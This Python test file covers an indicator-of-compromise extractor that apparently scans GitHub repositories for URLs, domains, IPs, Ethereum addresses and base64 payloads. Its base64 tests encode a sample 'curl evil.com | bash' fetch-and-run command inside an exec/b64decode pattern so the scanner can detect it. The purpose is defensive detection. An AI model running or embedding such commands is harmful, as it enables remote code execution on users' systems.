"""
Tests for ioc_extractor module — Module 4.

Loads FlexPay and clean repo fixtures from conftest.py.
No network calls.
"""

from unittest.mock import Mock

from repo_guard.github_client import GitHubClientError
from repo_guard.models import Severity
from repo_guard.modules.ioc_extractor import (
    scan,
    _extract_urls,
    _extract_domains,
    _extract_eth_addresses,
    _extract_ips,
    _extract_base64_blobs,
    _decode_base64,
    _is_text_file,
)
from tests.conftest import load_fixture, FLEXPAY_DIR, CLEAN_DIR


class TestIsTextFile:
    def test_python_file_is_text(self):
        assert _is_text_file("src/main.py") is True
        assert _is_text_file("setup.py") is True

    def test_markdown_file_is_text(self):
        assert _is_text_file("README.md") is True

    def test_json_file_is_text(self):
        assert _is_text_file(".vscode/tasks.json") is True
        assert _is_text_file("package.json") is True

    def test_shell_file_is_text(self):
        assert _is_text_file(".githooks/post-checkout") is True
        assert _is_text_file("deploy.sh") is True

    def test_binary_extensions_are_not_text(self):
        assert _is_text_file("image.png") is False
        assert _is_text_file("archive.zip") is False
        assert _is_text_file("font.woff2") is False

    def test_no_extension_not_text_by_default(self):
        assert _is_text_file("Makefile") is True
        assert _is_text_file("somefile") is False


class TestExtractUrls:
    def test_basic_urls(self):
        text = "Visit https://evil.com/payload or http://example.com"
        urls = _extract_urls(text)
        assert "https://evil.com/payload" in urls
        assert "http://example.com" in urls

    def test_no_urls(self):
        assert _extract_urls("Just some text without URLs") == []

    def test_multiple_urls(self):
        text = "a https://a.com b https://b.com c https://a.com"
        urls = _extract_urls(text)
        assert len(urls) == 2


class TestExtractDomains:
    def test_basic_domains(self):
        text = "Contact devops@flexpay.io or visit evil.com"
        domains = _extract_domains(text)
        assert "flexpay.io" in domains
        assert "evil.com" in domains

    def test_excludes_ips(self):
        text = "server at 192.168.1.1"
        domains = _extract_domains(text)
        assert "192.168.1.1" not in domains

    def test_no_domains(self):
        assert _extract_domains("no dots here") == []


class TestExtractEthAddresses:
    def test_valid_eth_address(self):
        addr = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e"
        result = _extract_eth_addresses(addr)
        assert len(result) == 1
        assert result[0] == addr

    def test_mixed_case(self):
        addr = "0xABCDEF0123456789abcdef0123456789abcdef01"
        result = _extract_eth_addresses(addr)
        assert len(result) == 1

    def test_no_addresses(self):
        assert _extract_eth_addresses("no addresses here") == []

    def test_wrong_length_ignored(self):
        text = "0x1234"
        assert _extract_eth_addresses(text) == []


class TestExtractIps:
    def test_valid_ip(self):
        assert _extract_ips("connect to 10.0.0.1") == ["10.0.0.1"]

    def test_invalid_octet_ignored(self):
        assert _extract_ips("bad ip 999.999.999.999") == []

    def test_no_ips(self):
        assert _extract_ips("no numbers here") == []


class TestExtractBase64Blobs:
    def test_valid_base64_detected(self):
        import base64
        payload = base64.b64encode(b"import os; os.system('ls')").decode()
        text = f"exec(base64.b64decode('{payload}'))"
        blobs = _extract_base64_blobs(text)
        assert len(blobs) >= 1
        assert payload in blobs

    def test_short_strings_ignored(self):
        blobs = _extract_base64_blobs("abc123")
        assert len(blobs) == 0

    def test_hex_strings_ignored(self):
        blobs = _extract_base64_blobs("a" * 30)
        assert len(blobs) == 0

    def test_invalid_base64_ignored(self):
        blobs = _extract_base64_blobs("!!!!invalid!!!!base64!!!!string!!!!")
        assert len(blobs) == 0


class TestDecodeBase64:
    def test_single_level(self):
        import base64
        payload = "import os; os.system('curl evil.com | bash')"
        encoded = base64.b64encode(payload.encode()).decode()
        text = f"encoded_payload = '{encoded}'"
        decoded = _decode_base64(text)
        assert len(decoded) >= 1
        assert "curl evil.com" in decoded[0]

    def test_max_depth(self):
        import base64
        inner = "hello world"
        for _ in range(4):
            inner = base64.b64encode(inner.encode()).decode()
        decoded = _decode_base64(inner)
        assert len(decoded) <= 3

    def test_empty_returns_empty(self):
        assert _decode_base64("") == []


class TestIocExtractorFlexPay:
    """FlexPay fixture has URLs, base64 payloads, domains, etc."""

    def _make_client(self) -> Mock:
        tree = [
            {"path": "README.md", "type": "blob", "sha": "a", "size": 50},
            {"path": ".githooks/post-checkout", "type": "blob", "sha": "b", "size": 500},
            {"path": ".vscode/tasks.json", "type": "blob", "sha": "c", "size": 200},
            {"path": ".vscode/settings.json", "type": "blob", "sha": "d", "size": 100},
        ]
        client = Mock()
        client.get_tree.return_value = tree
        def side_effect(o, r, path):
            return {
                "README.md": load_fixture("README.md", FLEXPAY_DIR),
                ".githooks/post-checkout": load_fixture(".githooks/post-checkout", FLEXPAY_DIR),
                ".vscode/tasks.json": load_fixture(".vscode/tasks.json", FLEXPAY_DIR),
                ".vscode/settings.json": load_fixture(".vscode/settings.json", FLEXPAY_DIR),
            }.get(path)
        client.get_file_content.side_effect = side_effect
        return client

    def test_flexpay_finds_urls(self):
        result = scan(self._make_client(), "flexpay", "repo", vt_key=None)
        urls = result.raw_data.get("iocs", {}).get("urls", [])
        assert len(urls) >= 1

    def test_flexpay_finds_base64_payloads(self):
        result = scan(self._make_client(), "flexpay", "repo", vt_key=None)
        b64 = result.raw_data.get("iocs", {}).get("base64_payloads", [])
        assert len(b64) >= 1

    def test_flexpay_returns_warning(self):
        result = scan(self._make_client(), "flexpay", "repo", vt_key=None)
        assert result.severity in (Severity.WARNING, Severity.CRITICAL)

    def test_flexpay_no_vt_note_included(self):
        result = scan(self._make_client(), "flexpay", "repo", vt_key=None)
        assert any("VirusTotal" in f.message for f in result.findings)

    def test_flexpay_with_vt_key_skips_note(self):
        result = scan(self._make_client(), "flexpay", "repo", vt_key="fake_vt_key")
        assert not any("VirusTotal enrichment not available" in f.message for f in result.findings)


class TestIocExtractorClean:
    """Clean repo has no IOCs."""

    def _make_client(self) -> Mock:
        tree = [
            {"path": "src/main.py", "type": "blob", "sha": "a", "size": 100},
            {"path": ".vscode/settings.json", "type": "blob", "sha": "b", "size": 50},
        ]
        client = Mock()
        client.get_tree.return_value = tree
        client.get_file_content.side_effect = lambda o, r, path: (
            load_fixture("src/main.py", CLEAN_DIR) if path == "src/main.py" else
            load_fixture(".vscode/settings.json", CLEAN_DIR) if path == ".vscode/settings.json" else None
        )
        return client

    def test_clean_repo_no_iocs(self):
        result = scan(self._make_client(), "owner", "clean-repo", vt_key=None)
        assert result.severity == Severity.CLEAN
        assert result.raw_data.get("iocs", {}).get("urls") == []

    def test_empty_repo_returns_clean(self):
        client = Mock()
        client.get_tree.return_value = []
        result = scan(client, "o", "r")
        assert result.severity == Severity.CLEAN

    def test_tree_fetch_failure_returns_info(self):
        client = Mock()
        client.get_tree.side_effect = GitHubClientError("API error")
        result = scan(client, "o", "r")
        assert result.severity == Severity.INFO
        assert "Could not fetch" in result.findings[0].message
